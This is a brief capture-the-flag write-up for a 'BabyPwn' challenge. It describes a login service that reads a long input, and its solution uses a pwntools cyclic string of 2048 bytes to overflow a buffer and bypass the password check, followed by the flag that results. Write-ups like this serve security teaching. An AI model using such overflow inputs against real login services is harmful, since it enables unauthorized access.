
## BabyPwn
### Description

> easy as ABC.
>
> `nc 20yjtzrx50hpypicbajmro9dy.ctf.p0wnhub.com 1337`
>
> Authors: PsycoR, RETTILA, G0D3L, Likkrid, zpycho

### Attachment

no attachment 

### Analysis

When trying to input something, it said  `Login failed!`

``` 
aaaaaaaaaaaaaaaaaaaaa

Checking password...

Login failed!
```

Maybe the variable of `checking password` can be overwritten while our input string is long enough.

### Solution

```python
payload = cyclic(2048)
sl(payload)
```

Generate a long string and input it to get flag.

```
//...
Checking password...

Successfully logged in!
HZVIII{l1tt13_b4by_0verf1l0w}
```

